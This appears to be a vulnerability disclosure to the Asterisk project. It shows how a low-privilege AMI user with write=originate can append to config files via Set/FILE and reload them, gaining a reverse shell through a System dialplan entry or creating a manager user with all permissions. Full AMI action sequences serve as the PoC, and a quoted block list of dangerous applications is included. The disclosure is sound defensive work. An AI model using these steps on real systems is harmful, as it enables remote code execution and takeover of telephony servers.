## Description

### Summary

Previously I logged an issue related to code execution being possible over the AMI with `live_dangerously=no`. However this was not considered a security concern due to the permissions required being quite broad. I have since then been able to replicate it with only

`Write=orignate`. This to me seems like something you would consider a vulnerability since,

**There is specific code in asterisk to try and prevent users with low permissions from taking certain sensitive actions**, for example running dialplans with the System Application. However within a low privilege Originate action you can still use

* Set+File
* Set+Curl
* Reload+manager
* Reload+pbx\_config.

This allows an AMI user with `write=originate` to change all configuration files in the `/etc/asterisk/` directory. As they are able to curl remote files and write them to disk. But are also able to append to existing files using the `FILE` function inside the `SET` application.

PS,

I don't want to be annoying and spam these reports, since there is not page I can find with what kind of bug / situation qualifies as a security problem, I feel the need to report this here instead of a normal issue / bug report. If you would rather not have these reports here please let me know. I will report what I find in the future elsewhere.

### Details

Setup a low privilege user

```
[testuser]
secret=testuser
write=originate
permit=127.0.0.1/255.255.255.0

```

Connect to the AMI using nc + Action login and take the following actions. (you might need to take some time between them).

```
Action: Login
Username: testuser
Secret: testuser

Action: Originate
Channel: Local/700@parkedcalls
Application: SET
Data: FILE(/etc/asterisk/extensions.conf,,,al)=[newcontext]

Action: Originate
Channel: Local/700@parkedcalls
Application: SET
Data: FILE(/etc/asterisk/extensions.conf,,,al)=exten => 111,1,System(/bin/bash -c 'sh -i >& /dev/tcp/127.0.0.1/4444 0>&1')

Action: Originate
Channel: Local/700@parkedcalls
Application: Reload
Data: pbx_config

Action: Originate
Channel: Local/111@newcontext
application: Verbose
Data: hello

```

This bypasses this piece of code in manager.c, which seems to be preventing users with low privilege from running the System application. and also prevents other sensitive functions. This code is present in supported versions of asterisk.

|  | strcasestr(app, "system") || /\* System(rm -rf /) |
| --- | --- |

```
	if (!(s->session->writeperm & EVENT_FLAG_SYSTEM)
			&& (
				strcasestr(app, "system") ||      /* System(rm -rf /)
				                                     TrySystem(rm -rf /)       */
				strcasestr(app, "exec") ||        /* Exec(System(rm -rf /))
				                                     TryExec(System(rm -rf /)) */
				strcasestr(app, "agi") ||         /* AGI(/bin/rm,-rf /)
				                                     EAGI(/bin/rm,-rf /)       */
				strcasestr(app, "mixmonitor") ||  /* MixMonitor(blah,,rm -rf)  */
				strcasestr(app, "externalivr") || /* ExternalIVR(rm -rf)       */
				strcasestr(app, "originate") ||   /* Originate(Local/1234,app,System,rm -rf) */
				(strstr(appdata, "SHELL") && (bad_appdata = 1)) ||       /* NoOp(${SHELL(rm -rf /)})  */
				(strstr(appdata, "EVAL") && (bad_appdata = 1))           /* NoOp(${EVAL(${some_var_containing_SHELL})}) */
				)) {
			char error_buf[64];
			snprintf(error_buf, sizeof(error_buf), "Originate Access Forbidden: %s", bad_appdata ? "Data" : "Application");
			astman_send_error(s, m, error_buf);
			res = 0;
			goto fast_orig_cleanup;

```

This can probably also be fixed by not allowing `appdata` with `"FILE"` or `"CURL"` in it. and perhaps also banning the `"Reload"` `app`

### PoC

See details section above, but this also works for creating manager users with all permissions.

```
Action: Originate
Channel: Local/700@parkedcalls
Application: SET
Data: FILE(/etc/asterisk/manager.conf,,,al)=[newuser]

Action: Originate
Channel: Local/700@parkedcalls
Application: SET
Data: FILE(/etc/asterisk/manager.conf,,,al)=secret=newuser

Action: Originate
Channel: Local/700@parkedcalls
Application: SET
Data: FILE(/etc/asterisk/manager.conf,,,al)=write=all

Action: Originate
Channel: Local/700@parkedcalls
Application: SET
Data: FILE(/etc/asterisk/manager.conf,,,al)=permit=127.0.0.1/255.255.255.255

Action: Originate
Channel: Local/700@parkedcalls
Application: reload
Data: manager

```

use nc to connect to the localhost 5038 as newuser, you now have all permissions.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
